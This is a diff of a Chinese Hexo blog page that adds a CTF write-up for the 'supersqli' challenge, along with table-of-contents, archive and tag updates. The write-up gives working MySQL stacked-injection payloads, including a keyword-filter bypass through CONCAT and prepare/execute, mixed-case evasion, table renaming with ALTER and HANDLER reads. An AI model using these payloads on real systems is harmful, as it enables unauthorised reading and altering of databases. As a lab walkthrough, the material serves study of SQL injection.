@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">546</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">996</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -416,6 +416,14 @@ height:50vh;
 
 <p>将如下代码拿到控制台运行即可获得flag。<br><img src="/images/2020-2-29/12.png" alt></p>
 <h2 id="0x13-ics-06"><a href="#0x13-ics-06" class="headerlink" title="0x13  ics-06"></a>0x13  ics-06</h2><p>1.直接去报表中心查看<br><img src="/images/2020-2-29/7.png" alt><br>本来以为是注入，但是没成功。<br>题目提醒有一处留下了痕迹，所以决定就遍历id。<br>2.用bp抓包爆破<br><img src="/images/2020-2-29/8.png" alt><br>得到id=2333。<br><img src="/images/2020-2-29/9.png" alt><br><img src="/images/2020-2-29/10.png" alt></p>
+<h2 id="0x14-supersqli"><a href="#0x14-supersqli" class="headerlink" title="0x14 supersqli"></a>0x14 supersqli</h2><p>1.正常查询<br><img src="/images/2020-7-21/1.png" alt><br>2.尝试注入，从报错信息可以看出是mysql数据库。发现<code>1&#39; #</code> <code>1&#39; and 1=1#</code>可以正常回显，<code>1&#39; and 1=2#</code>无回显，就试试union，发现很多字段被过滤。<br><img src="/images/2020-7-21/2.png" alt><br>3.尝试堆叠注入。</p>
+<blockquote>
+<p><strong>堆叠注入</strong>：一堆 sql 语句(多条)一起执行。在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。多句一起使用。叫做 stacked  injection。<br>查看表<br><code>-1&#39;;show tables --+</code><br><img src="/images/2020-7-21/3.png" alt><br>查看字段<br>-1’;show columns from <code>1919810931114514</code> –+<br>注：字符串为表名操作时要加反引号。<br><img src="/images/2020-7-21/4.png" alt><br>-1’;show columns from <code>words</code> –+<br><img src="/images/2020-7-21/5.png" alt><br>发现flag字段，来查看字段值，需要绕过select的限制，我们可以使用预编译的方式。<br>-1’;set @sql = CONCAT(‘se’,’lect * from <code>1919810931114514</code>;’);prepare stmt from @sql;EXECUTE stmt;#<br>参考<a href="https://www.cnblogs.com/geaozhang/p/9891338.html" target="_blank" rel="noopener">https://www.cnblogs.com/geaozhang/p/9891338.html</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @sql = CONCAT(&apos;se&apos;,&apos;lect * from `1919810931114514`;&apos;);-- MySQL的concat函数可以连接一个或者多个字符串</span><br><span class="line">prepare stmt from @sql;</span><br><span class="line">EXECUTE stmt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2020-7-21/6.png" alt><br>用strstr函数过滤了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可。</p>
+<p>-1’;sEt @sql = CONCAT(‘se’,’lect * from <code>1919810931114514</code>;’);prEpare stmt from @sql;EXECUTE stmt;#<br><img src="/images/2020-7-21/7.png" alt><br>另辟蹊径一：<br>根据两个表的情况结合实际查询出结果的情况判断出words是默认查询的表，因为查询出的结果是一个数字加一个字符串，words表结构是id和data，传入的inject参数也就是赋值给了id。<br>将表1919810931114514名字改为words，flag列名字改为id，那么就能得到flag的内容了。<br>1’; alter table words rename to words1;alter table <code>1919810931114514</code> rename to words;alter table words change flag id varchar(50);#<br>然后使用1’ or 1=1#即可查询出flag。<br>使用handler查询，payload如下：<br>另辟蹊径二：<br>参考<a href="https://www.jianshu.com/p/81fad5351736" target="_blank" rel="noopener">https://www.jianshu.com/p/81fad5351736</a><br>-1’;handler <code>1919810931114514</code> open;handler <code>1919810931114514</code> read first;#</p>
 
     </article>
     <!-- license  -->
@@ -423,6 +431,11 @@ height:50vh;
     <!-- paginator  -->
     <ul class="post-paginator">
         <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2020/03/11/“web安全笔记”/" title= "“web安全笔记”">
+                    <div class="nextTitle">“web安全笔记”</div>
+                </a>
             
         </li>
         <li class="previous">
@@ -539,7 +552,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#新手练习区"><span class="toc-number">1.</span> <span class="toc-text">新手练习区</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-简单的php"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 简单的php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-xff-referer"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 xff_referer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-webshell"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#command-execution"><span class="toc-number">1.4.</span> <span class="toc-text">command_execution</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#高手进阶区"><span class="toc-number">2.</span> <span class="toc-text">高手进阶区</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-baby-web"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 baby_web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Training-WWW-Robots"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 Training-WWW-Robots</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-php-rce"><span class="toc-number">2.3.</span> <span class="toc-text">0x03 php_rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-NewsCenter"><span class="toc-number">2.4.</span> <span class="toc-text">0x05 NewsCenter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-NaNNaNNaNNaN-Batman"><span class="toc-number">2.5.</span> <span class="toc-text">0x07  NaNNaNNaNNaN-Batman</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-ics-06"><span class="toc-number">2.6.</span> <span class="toc-text">0x13  ics-06</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#新手练习区"><span class="toc-number">1.</span> <span class="toc-text">新手练习区</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-简单的php"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 简单的php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-xff-referer"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 xff_referer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-webshell"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#command-execution"><span class="toc-number">1.4.</span> <span class="toc-text">command_execution</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#高手进阶区"><span class="toc-number">2.</span> <span class="toc-text">高手进阶区</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-baby-web"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 baby_web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Training-WWW-Robots"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 Training-WWW-Robots</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-php-rce"><span class="toc-number">2.3.</span> <span class="toc-text">0x03 php_rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-NewsCenter"><span class="toc-number">2.4.</span> <span class="toc-text">0x05 NewsCenter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-NaNNaNNaNNaN-Batman"><span class="toc-number">2.5.</span> <span class="toc-text">0x07  NaNNaNNaNNaN-Batman</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-ics-06"><span class="toc-number">2.6.</span> <span class="toc-text">0x13  ics-06</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14-supersqli"><span class="toc-number">2.7.</span> <span class="toc-text">0x14 supersqli</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -671,9 +684,116 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 11
+        Total : 18
         </div>
         <!-- search  -->
         
@@ -686,6 +806,41 @@ top:50vh;
     
     <div class="archive-year"> 2020 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href= "/2020/07/19/漏洞/" >漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/25</span><a class="archive-post-title" href= "/2020/03/25/链接笔记/" >链接笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/2020/03/24/软件测试笔记/" >软件测试笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/2020/03/14/笔试笔记/" >笔试笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/2020/03/14/Python笔记/" >Python笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/2020/03/12/dvwa笔记/" >'dvwa笔记'</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span><a class="archive-post-title" href= "/2020/03/11/“web安全笔记”/" >“web安全笔记”</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -762,17 +917,21 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="blog"><span class="iconfont-archer">&#xe606;</span>blog</span>
     
+        <span class="sidebar-tag-name" data-tags="Python"><span class="iconfont-archer">&#xe606;</span>Python</span>
+    
         <span class="sidebar-tag-name" data-tags="VLAN"><span class="iconfont-archer">&#xe606;</span>VLAN</span>
-    
-        <span class="sidebar-tag-name" data-tags="photo"><span class="iconfont-archer">&#xe606;</span>photo</span>
-    
-        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
-    
-        <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
     
+        <span class="sidebar-tag-name" data-tags="photo"><span class="iconfont-archer">&#xe606;</span>photo</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
+    
+        <span class="sidebar-tag-name" data-tags="测试"><span class="iconfont-archer">&#xe606;</span>测试</span>
+    
         <span class="sidebar-tag-name" data-tags="计算机网络"><span class="iconfont-archer">&#xe606;</span>计算机网络</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="路由"><span class="iconfont-archer">&#xe606;</span>路由</span>
     
@@ -811,11 +970,15 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="study"><span class="iconfont-archer">&#xe60a;</span>study</span>
     
+        <span class="sidebar-category-name" data-categories="Python"><span class="iconfont-archer">&#xe60a;</span>Python</span>
+    
         <span class="sidebar-category-name" data-categories="photos"><span class="iconfont-archer">&#xe60a;</span>photos</span>
     
-        <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
+        <span class="sidebar-category-name" data-categories="测试"><span class="iconfont-archer">&#xe60a;</span>测试</span>
     
         <span class="sidebar-category-name" data-categories="计算机网络"><span class="iconfont-archer">&#xe60a;</span>计算机网络</span>
+    
+        <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
